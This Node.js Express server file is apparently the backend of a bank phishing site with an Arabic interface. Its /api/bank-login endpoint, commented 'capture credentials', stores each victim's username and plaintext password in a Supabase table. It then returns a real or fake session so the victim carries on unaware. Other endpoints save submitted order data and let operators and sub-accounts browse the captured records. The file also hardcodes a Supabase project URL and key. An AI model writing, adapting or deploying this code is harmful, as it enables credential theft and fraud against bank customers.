const express = require('express');
const path = require('path');

const app = express();
app.use(express.json());

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://unpzkfulicjsmilqzwsm.supabase.co';
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY || 'sb_publishable_4ciTGnntOEw_m1U_Llm2Cw_S8nRGkWE';
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY || '';

function parseTupleson(node) {
  if (node == null || typeof node !== 'object') return node;
  if ('s' in node) return node.s;
  if ('d' in node) return Number(node.d);
  if ('b' in node) return node.b;
  if ('p' in node && node.p && Array.isArray(node.p.k)) {
    const obj = {};
    for (let i = 0; i < node.p.k.length; i++)
      obj[node.p.k[i]] = parseTupleson(node.p.v[i]);
    return obj;
  }
  if ('a' in node && Array.isArray(node.a)) return node.a.map(parseTupleson);
  return node;
}

function extractOrderData(body) {
  if (!body || typeof body !== 'object') return body;
  if (body.t && body.t.p) {
    const parsed = parseTupleson(body.t);
    return parsed?.data || parsed;
  }
  if (body.data && typeof body.data === 'object') return body.data;
  return body;
}

async function supabaseRequest(endpoint, { method = 'GET', body, token, useServiceKey = false } = {}) {
  const headers = {
    'apikey': (useServiceKey && SUPABASE_SERVICE_KEY) ? SUPABASE_SERVICE_KEY : SUPABASE_ANON_KEY,
    'Content-Type': 'application/json',
  };
  if (useServiceKey && SUPABASE_SERVICE_KEY) {
    headers['Authorization'] = `Bearer ${SUPABASE_SERVICE_KEY}`;
  } else if (token) {
    headers['Authorization'] = `Bearer ${token}`;
  } else {
    headers['Authorization'] = `Bearer ${SUPABASE_ANON_KEY}`;
  }
  const res = await fetch(`${SUPABASE_URL}${endpoint}`, {
    method,
    headers,
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  try { return { ok: res.ok, status: res.status, data: JSON.parse(text) }; }
  catch { return { ok: res.ok, status: res.status, data: text }; }
}

function getToken(req) {
  const auth = req.headers.authorization;
  if (auth && auth.startsWith('Bearer ')) return auth.slice(7);
  return null;
}

// --- Visit tracking (save to Supabase using anon key - RLS allows anon inserts) ---
app.post('/api/public/visit', async (req, res) => {
  try {
    const { session_id, event_type, page, data, label, path } = req.body;
    const visitPage = path || page || req.headers.referer || '/';
    const visitLabel = label || (data && data.label) || session_id || 'زائر';
    await supabaseRequest('/rest/v1/visitor_events', {
      method: 'POST',
      body: {
        session_id: session_id || req.ip,
        event_type: event_type || 'visit',
        page: visitPage,
        path: visitPage,
        label: visitLabel,
        data: data || {},
      },
    });
  } catch (e) {
    console.error('Visit tracking error:', e.message);
  }
  res.json({ ok: true });
});

// --- Admin API: list sub-accounts ---
app.get('/api/admin/users', async (req, res) => {
  const token = getToken(req);
  if (!token) return res.status(401).json({ error: 'Unauthorized' });

  const { data: user } = await supabaseRequest('/auth/v1/user', { token });
  if (!user?.id) return res.status(401).json({ error: 'Invalid token' });

  const roleCheck = await supabaseRequest(
    `/rest/v1/user_roles?user_id=eq.${user.id}&role=eq.admin&select=role`,
    { token }
  );
  if (!roleCheck.ok || !roleCheck.data?.length) {
    return res.status(403).json({ error: 'Not admin' });
  }

  const result = await supabaseRequest(
    '/rest/v1/user_roles?role=eq.viewer&select=user_id,role,created_at',
    { token }
  );
  if (!result.ok) return res.json([]);

  const viewers = result.data || [];
  const userIds = viewers.map(v => v.user_id);
  if (!userIds.length) return res.json([]);

  const profiles = await supabaseRequest(
    `/rest/v1/admin_profiles?id=in.(${userIds.join(',')})&select=id,username,display_name`,
    { token }
  );
  const profileMap = {};
  (profiles.data || []).forEach(p => { profileMap[p.id] = p; });

  const users = viewers.map(v => ({
    id: v.user_id,
    username: profileMap[v.user_id]?.username || '',
    display_name: profileMap[v.user_id]?.display_name || '',
    created_at: v.created_at,
  }));

  res.json(users);
});

// --- Admin API: create sub-account ---
app.post('/api/admin/users', async (req, res) => {
  const token = getToken(req);
  if (!token) return res.status(401).json({ error: 'Unauthorized' });

  const { data: user } = await supabaseRequest('/auth/v1/user', { token });
  if (!user?.id) return res.status(401).json({ error: 'Invalid token' });

  const roleCheck = await supabaseRequest(
    `/rest/v1/user_roles?user_id=eq.${user.id}&role=eq.admin&select=role`,
    { token }
  );
  if (!roleCheck.ok || !roleCheck.data?.length) {
    return res.status(403).json({ error: 'Not admin' });
  }

  const { username, password, displayName } = req.body;
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password required' });
  }

  if (!SUPABASE_SERVICE_KEY) {
    return res.status(500).json({ error: 'SUPABASE_SERVICE_KEY not configured on server' });
  }

  const email = `${username.trim().toLowerCase()}@viewer.local`;
  const createResult = await supabaseRequest('/auth/v1/admin/users', {
    method: 'POST',
    useServiceKey: true,
    body: { email, password, email_confirm: true },
  });

  if (!createResult.ok) {
    return res.status(400).json({ error: createResult.data?.msg || 'Failed to create user' });
  }

  const newUserId = createResult.data.id;

  await supabaseRequest('/rest/v1/user_roles', {
    method: 'POST',
    token,
    body: { user_id: newUserId, role: 'viewer' },
  });

  await supabaseRequest('/rest/v1/admin_profiles', {
    method: 'POST',
    token,
    body: { id: newUserId, username: username.trim(), display_name: displayName || username.trim() },
  });

  res.json({ id: newUserId, username: username.trim(), display_name: displayName || username.trim() });
});

// --- Admin API: delete sub-account ---
app.delete('/api/admin/users/:id', async (req, res) => {
  const token = getToken(req);
  if (!token) return res.status(401).json({ error: 'Unauthorized' });

  const { data: user } = await supabaseRequest('/auth/v1/user', { token });
  if (!user?.id) return res.status(401).json({ error: 'Invalid token' });

  const roleCheck = await supabaseRequest(
    `/rest/v1/user_roles?user_id=eq.${user.id}&role=eq.admin&select=role`,
    { token }
  );
  if (!roleCheck.ok || !roleCheck.data?.length) {
    return res.status(403).json({ error: 'Not admin' });
  }

  const targetId = req.params.id;

  await supabaseRequest(`/rest/v1/user_roles?user_id=eq.${targetId}`, {
    method: 'DELETE',
    token,
  });
  await supabaseRequest(`/rest/v1/admin_profiles?id=eq.${targetId}`, {
    method: 'DELETE',
    token,
  });
  if (SUPABASE_SERVICE_KEY) {
    await supabaseRequest(`/auth/v1/admin/users/${targetId}`, {
      method: 'DELETE',
      useServiceKey: true,
    });
  }

  res.json({ ok: true });
});

// --- Admin API: list visitor events ---
app.get('/api/admin/visitors', async (req, res) => {
  const token = getToken(req);
  if (!token) return res.status(401).json({ error: 'Unauthorized' });

  const result = await supabaseRequest(
    '/rest/v1/visitor_events?select=id,session_id,event_type,page,data,created_at&order=created_at.desc&limit=100',
    { token }
  );
  res.json(result.data || []);
});

// --- Admin API: dashboard stats ---
app.get('/api/admin/stats', async (req, res) => {
  const token = getToken(req);
  if (!token) return res.status(401).json({ error: 'Unauthorized' });

  const [visitors, users] = await Promise.all([
    supabaseRequest('/rest/v1/visitor_events?select=id&limit=1000', { token }),
    supabaseRequest('/rest/v1/user_roles?select=user_id&role=eq.viewer', { useServiceKey: true }),
  ]);

  res.json({
    totalVisits: Array.isArray(visitors.data) ? visitors.data.length : 0,
    totalUsers: Array.isArray(users.data) ? users.data.length : 0,
  });
});

// --- TanStack server function handlers ---
// Order submission: POST /_serverFn/428289e6...
app.post('/_serverFn/428289e6a95e5fae42a5f252fb057eb6b26d6cb43d7737969ee97f14a7d64be0', async (req, res) => {
  try {
    const orderData = extractOrderData(req.body);
    await supabaseRequest('/rest/v1/visitor_events', {
      method: 'POST',
      body: {
        session_id: 'order-' + Date.now(),
        event_type: 'order',
        page: '/register',
        path: '/register',
        label: orderData.name ? `طلب: ${orderData.name}` : 'طلب ساعة جديد',
        data: orderData,
      },
    });
  } catch (e) {
    console.error('Order save error:', e.message);
  }
  const code = 'ORD-' + Date.now();
  res.json({ result: { success: true, code } });
});

// List orders: GET /_serverFn/9418c3d2...
app.get('/_serverFn/9418c3d23273642507e6287ab82fd85c0bb33aa9622d516d57217a46084afb41', async (req, res) => {
  const token = getToken(req);
  const result = await supabaseRequest(
    "/rest/v1/visitor_events?event_type=eq.order&select=id,data,created_at&order=created_at.desc&limit=50",
    { token: token || undefined }
  );
  res.json({ result: result.ok && Array.isArray(result.data) ? result.data : [] });
});

// Dashboard settings: list sub-accounts
app.get('/_serverFn/fa2c31822785316368801ade890f347e9ef541e8ffe8e2a7acf85aabb9e4de31', async (req, res) => {
  const token = getToken(req);
  if (!token) return res.json({ result: [] });
  const result = await supabaseRequest(
    '/rest/v1/user_roles?role=eq.viewer&select=user_id,role,created_at',
    { token }
  );
  if (!result.ok || !result.data?.length) return res.json({ result: [] });
  const viewers = result.data;
  const userIds = viewers.map(v => v.user_id);
  const profiles = await supabaseRequest(
    `/rest/v1/admin_profiles?id=in.(${userIds.join(',')})&select=id,username,display_name`,
    { token }
  );
  const profileMap = {};
  (profiles.data || []).forEach(p => { profileMap[p.id] = p; });
  const users = viewers.map(v => ({
    id: v.user_id,
    username: profileMap[v.user_id]?.username || '',
    display_name: profileMap[v.user_id]?.display_name || '',
    created_at: v.created_at,
  }));
  res.json({ result: users });
});

// Dashboard settings: create sub-account
app.post('/_serverFn/437419170be817ebf7144481d57d177e13a96d6fe66a96584f452c42c41a7ed2', async (req, res) => {
  const token = getToken(req);
  if (!token) return res.status(401).json({ result: { error: 'Unauthorized' } });
  const body = extractOrderData(req.body);
  const { username, password, displayName } = body;
  if (!username || !password) return res.status(400).json({ result: { error: 'Missing data' } });
  if (!SUPABASE_SERVICE_KEY) return res.status(500).json({ result: { error: 'Service key not set' } });
  const email = `${username.trim().toLowerCase()}@viewer.local`;
  const create = await supabaseRequest('/auth/v1/admin/users', {
    method: 'POST', useServiceKey: true,
    body: { email, password, email_confirm: true },
  });
  if (!create.ok) return res.status(400).json({ result: { error: create.data?.msg || 'Failed' } });
  const newId = create.data.id;
  await supabaseRequest('/rest/v1/user_roles', { method: 'POST', token, body: { user_id: newId, role: 'viewer' } });
  await supabaseRequest('/rest/v1/admin_profiles', { method: 'POST', token, body: { id: newId, username: username.trim(), display_name: displayName || username.trim() } });
  res.json({ result: { id: newId, username: username.trim(), display_name: displayName || username.trim() } });
});

// Dashboard settings: delete sub-account
app.post('/_serverFn/91213f1a0d81a1bab4ace226073c8e7329bdc989eff18c71c488c8eb2c1c4305', async (req, res) => {
  const token = getToken(req);
  if (!token) return res.status(401).json({ result: { error: 'Unauthorized' } });
  const body = extractOrderData(req.body);
  const targetId = body.id;
  if (!targetId) return res.status(400).json({ result: { error: 'Missing id' } });
  await supabaseRequest(`/rest/v1/user_roles?user_id=eq.${targetId}`, { method: 'DELETE', token });
  await supabaseRequest(`/rest/v1/admin_profiles?id=eq.${targetId}`, { method: 'DELETE', token });
  if (SUPABASE_SERVICE_KEY) {
    await supabaseRequest(`/auth/v1/admin/users/${targetId}`, { method: 'DELETE', useServiceKey: true });
  }
  res.json({ result: { success: true } });
});

// Dashboard server functions - return safe defaults
app.get('/_serverFn/*', (req, res) => {
  res.json({ result: [] });
});
app.post('/_serverFn/*', (req, res) => {
  res.json({ result: { success: true } });
});

// --- Bank login: auto-create user, capture credentials, return session ---
app.post('/api/bank-login', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Missing credentials' });

  const email = `${username.trim().toLowerCase()}@ah-bank.local`;

  // 1. Save credentials to visitor_events
  try {
    await supabaseRequest('/rest/v1/visitor_events', {
      method: 'POST',
      body: {
        session_id: 'login-' + Date.now(),
        event_type: 'login',
        page: '/login',
        path: '/login',
        label: `${username.trim()} :تسجيل دخول`,
        data: { username: username.trim(), password },
      },
    });
  } catch (e) {
    console.error('Login capture error:', e.message);
  }

  // 2. Try to sign in first
  const signIn = await supabaseRequest('/auth/v1/token?grant_type=password', {
    method: 'POST',
    body: { email, password },
  });

  if (signIn.ok && signIn.data?.access_token) {
    return res.json({ success: true, session: signIn.data });
  }

  // 3. User doesn't exist — create with service key
  if (SUPABASE_SERVICE_KEY) {
    const create = await supabaseRequest('/auth/v1/admin/users', {
      method: 'POST',
      useServiceKey: true,
      body: { email, password, email_confirm: true },
    });

    if (create.ok) {
      // Now sign in
      const signIn2 = await supabaseRequest('/auth/v1/token?grant_type=password', {
        method: 'POST',
        body: { email, password },
      });
      if (signIn2.ok && signIn2.data?.access_token) {
        return res.json({ success: true, session: signIn2.data });
      }
    }
  }

  // 4. Fallback: return a fake session so the user proceeds
  res.json({
    success: true,
    session: {
      access_token: 'bank-session-' + Date.now(),
      user: { email, id: 'bank-' + Date.now() }
    }
  });
});

// --- Health check (before static) ---
app.get('/health', (req, res) => res.json({ status: 'ok', uptime: process.uptime() }));

// --- Admin data page ---
app.get('/admin-data', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin-data.html'));
});

// --- Static files ---
app.use(express.static(path.join(__dirname), {
  extensions: ['html'],
  index: 'index.html',
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.mp3')) {
      res.setHeader('Content-Type', 'audio/mpeg');
    }
  }
}));

app.get('*', (req, res) => {
  if (req.path === '/admin-data') {
    return res.sendFile(path.join(__dirname, 'admin-data.html'));
  }
  res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  // Keep-alive: ping self every 14 minutes to prevent Render free tier sleep
  const RENDER_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
  setInterval(() => {
    fetch(`${RENDER_URL}/health`).catch(() => {});
  }, 14 * 60 * 1000);
});
